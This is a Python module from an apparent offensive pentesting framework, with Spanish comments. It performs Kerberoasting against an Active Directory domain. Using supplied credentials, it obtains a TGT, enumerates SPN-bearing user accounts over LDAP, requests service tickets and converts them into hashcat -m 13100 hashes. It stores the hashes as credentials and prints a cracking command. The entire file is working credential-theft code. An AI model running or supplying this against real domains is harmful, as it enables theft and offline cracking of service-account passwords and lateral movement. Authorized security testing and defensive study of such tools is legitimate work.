# scripts/kerberos/extraction/kerberoasting.py
"""
Kerberoasting — solicita TGS para cuentas con SPN y genera
hashes en formato hashcat -m 13100 ($krb5tgs$23$...).

Usa el pipeline getKerberosTGT + getKerberosTGS de impacket,
idéntico a impacket/examples/GetUserSPNs.py.
"""

from core.output import console
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.krb5.asn1 import TGS_REP
    from impacket.ldap import ldap, ldapasn1
    from pyasn1.codec.ber import decoder
    _IMPACKET_OK = True
except ImportError:
    _IMPACKET_OK = False


def _format_hash(spn, username, realm, tgs_rep_blob):
    """
    Construye el string hashcat -m 13100 a partir de los bytes DER del TGS-REP.
    Replica exactamente la salida de GetUserSPNs.py.
    """
    decoded     = decoder.decode(tgs_rep_blob, asn1Spec=TGS_REP())[0]
    ticket_enc  = decoded["ticket"]["enc-part"]
    etype       = int(ticket_enc["etype"])
    cipher      = bytes(ticket_enc["cipher"])

    # RC4-HMAC (23): primeros 16 bytes = checksum, el resto = datos
    # AES (17/18): misma convención de división para hashcat
    checksum = cipher[:16].hex()
    data     = cipher[16:].hex()

    if etype in (23, -133):
        tag = "$krb5tgs$23$"
    elif etype == 17:
        tag = "$krb5tgs$17$"
    elif etype == 18:
        tag = "$krb5tgs$18$"
    else:
        tag = f"$krb5tgs${etype}$"

    return f"{tag}*{username}${realm}${spn}*${checksum}${data}"


class Script(BaseScript):
    name        = "kerberoasting"
    protocol    = "kerberos"
    category    = "extraction"
    description = (
        "Solicita TGS para cuentas con SPN y genera hashes hashcat -m 13100. "
        "Requiere credenciales válidas."
    )

    def run(self, **kwargs):
        if not _IMPACKET_OK:
            console.print("[red]impacket no está instalado.[/red]")
            return None

        ip       = self.target.ip
        domain   = self.creds.domain   or ""
        user     = self.creds.user     or ""
        passwd   = self.creds.password or ""
        nt_hash  = self.creds.hash     or ""
        spn_arg  = kwargs.get("spn", "")

        if not domain or not user:
            console.print("[red]Requiere: -d <dominio> -u <usuario> y -p o -H[/red]")
            return None

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        # ── 1. Obtener TGT ───────────────────────────────────────────────────────
        console.print(f"[dim][kerberoasting] Obteniendo TGT para {user}@{domain}...[/dim]")
        try:
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
                password   = passwd,
                domain     = domain,
                lmhash     = bytes.fromhex(lm_hash)  if lm_hash  else b"",
                nthash     = bytes.fromhex(nt_hash)   if nt_hash  else b"",
                aesKey     = b"",
                kdcHost    = ip,
            )
        except Exception as e:
            console.print(f"[red]TGT falló: {e}[/red]")
            return None

        # ── 2. Buscar SPNs (LDAP) o usar el proporcionado ────────────────────────
        spn_accounts = []

        if spn_arg:
            spn_accounts = [(user, spn_arg)]
        else:
            console.print("[dim][kerberoasting] Enumerando cuentas SPN vía LDAP...[/dim]")
            try:
                ldap_conn = ldap.LDAPConnection(f"ldap://{ip}", domain, ip)
                ldap_conn.login(user, passwd, domain, lm_hash, nt_hash)

                filt = (
                    "(&(servicePrincipalName=*)"
                    "(UserAccountControl:1.2.840.113556.1.4.803:=512)"
                    "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))"
                    "(!(objectCategory=computer)))"
                )
                resp = ldap_conn.search(
                    searchFilter = filt,
                    attributes   = ["sAMAccountName", "servicePrincipalName"],
                    sizeLimit    = 0,
                )
                for item in resp:
                    if not isinstance(item, ldapasn1.SearchResultEntry):
                        continue
                    sam, spns = "", []
                    for attr in item["attributes"]:
                        aname = str(attr["type"])
                        avals = [str(v) for v in attr["vals"]]
                        if aname == "sAMAccountName":
                            sam = avals[0]
                        elif aname == "servicePrincipalName":
                            spns = avals
                    if sam and spns:
                        spn_accounts.append((sam, spns[0]))
            except Exception as e:
                console.print(f"[yellow]Enumeración LDAP falló: {e}[/yellow]")

        if not spn_accounts:
            console.print("[yellow]No se encontraron cuentas SPN.[/yellow]")
            return None

        console.print(f"[dim][kerberoasting] {len(spn_accounts)} cuenta(s) SPN encontradas. Solicitando TGS...[/dim]\n")

        # ── 3. Solicitar TGS y formatear hash ────────────────────────────────────
        hashes = []
        for sam, spn in spn_accounts:
            try:
                server_name = Principal(
                    spn,
                    type=constants.PrincipalNameType.NT_SRV_INST.value
                )
                tgs, tgs_cipher, _, tgs_session_key = getKerberosTGS(
                    serverName = server_name,
                    domain     = domain,
                    kdcHost    = ip,
                    tgt        = tgt,
                    cipher     = cipher,
                    sessionKey = session_key,
                )
                hash_str = _format_hash(spn, sam, domain, tgs)
                hashes.append((sam, spn, hash_str))

                console.print(f"  [green]✓[/green] [bold]{sam}[/bold]  ({spn})")
                console.print(f"    [cyan]{hash_str}[/cyan]\n")

                session_db.DB.SaveFinding(ip, "KERBEROS", "kerberoastable", f"user={sam} spn={spn}")
                session_db.DB.SaveCredential(ip, sam, hash_str, "krb5tgs", False, "kerberoasting")

            except Exception as e:
                console.print(f"  [red]✗[/red] {sam} ({spn}): {e}")

        if hashes:
            console.print(f"[bold green]{len(hashes)} hash(es) obtenido(s).[/bold green]")
            console.print("[dim]Crackear con: hashcat -m 13100 hashes.txt wordlist.txt[/dim]")

        return [h[2] for h in hashes] or None
